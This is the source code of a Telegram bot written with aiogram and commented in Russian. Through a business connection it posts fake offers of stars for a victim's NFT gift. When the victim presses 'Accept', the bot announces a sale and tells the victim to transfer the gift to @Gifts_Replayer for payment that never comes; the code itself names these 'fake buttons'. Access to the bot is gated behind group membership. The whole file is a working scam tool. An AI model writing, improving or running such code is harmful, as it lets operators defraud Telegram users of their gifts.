import asyncio
import os
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- НАСТРОЙКИ ПОДПИСКИ ---
TARGET_CHAT_ID = -1003747516067  # Твой ID группы
INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6" # Ссылка на группу

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

# Функция проверки подписки
async def is_subscribed(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Ошибка проверки подписки: {e}")
        return False

# --- 1. ОБРАБОТКА /start С ПРОВЕРКОЙ ПОДПИСКИ ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]
        ])
        await message.answer(
            "⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\n"
            "Вступите в группу и отправьте /start снова.",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    else:
        await message.answer(
            "✅ <b>Вы подписаны!</b>\n\n"
            "Этот бот предназначен для визуализации NFT-офферов в режиме автоматизации чатов.\n\n"
            "❌ Генерация офферов в личных сообщениях недоступна.\n"
            "✅ Чтобы увидеть оффер, дождитесь его в чате от пользователя.",
            parse_mode="HTML"
        )

# --- 2. БЛОКИРОВКА /of ДЛЯ ОБЫЧНЫХ ПОЛЬЗОВАТЕЛЕЙ ---
@dp.message(F.text.startswith("/of"))
async def block_offer_in_pm(message: types.Message):
    await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")

# --- 3. РАБОТА БОТА ТОЛЬКО В БИЗНЕС-ЧАТАХ ---
@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id:
        return

    # Проверка подписки перед отправкой оффера
    if not await is_subscribed(message.from_user.id):
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]
        ])
        await bot.send_message(
            chat_id=message.chat.id,
            text="⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>",
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML"
        )
        return

    parts = message.text.split()
    if len(parts) < 3:
        return

    link = parts[1]
    try:
        amount = int(parts[2])
    except ValueError:
        return

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match:
        return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

    try:
        await bot.delete_business_messages(
            business_connection_id=business_connection_id,
            message_ids=[message.message_id]
        )

        caption_text = (
            f"Пользователь ({username})\n"
            f"предлагает вам\n"
            f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
                InlineKeyboardButton(text="Принять", callback_data=f"accept:{gift_slug}:{amount}")
            ]
        ])

        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=link,
                show_above_text=True,
                prefer_large_media=True
            )
        )

    except Exception as e:
        print(f"Ошибка отправки: {e}")

# --- 4. ОБРАБОТКА КНОПОК ---
@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message:
        await callback.answer("Сообщение не найдено.", show_alert=True)
        return

    if not await is_subscribed(callback.from_user.id):
        await callback.answer("Вы вышли из группы! Вступите обратно, чтобы продолжить.", show_alert=True)
        return

    data_parts = callback.data.split(":")
    action = data_parts[0]
    gift_slug = data_parts[1]
    amount = data_parts[2]

    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id

    try:
        if business_connection_id:
            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
        else:
            try:
                await callback.message.delete()
            except:
                pass

        if action == "accept":
            new_text = (
                f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
            )
            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Передать NFT", url="https://t.me/Gifts_Replayer")]
            ])
        else:
            new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
            new_keyboard = None

        kwargs = {
            "chat_id": callback.message.chat.id,
            "text": new_text,
            "reply_markup": new_keyboard,
            "parse_mode": "HTML",
            "link_preview_options": LinkPreviewOptions(
                url=link,
                show_above_text=True,
                prefer_large_media=True
            )
        }
        
        if business_connection_id:
            kwargs["business_connection_id"] = business_connection_id

        await bot.send_message(**kwargs)
        await callback.answer()

    except TelegramBadRequest:
        await callback.answer()
    except Exception as e:
        print(f"Ошибка обработки кнопки: {e}")
        await callback.answer("Произошла ошибка.", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
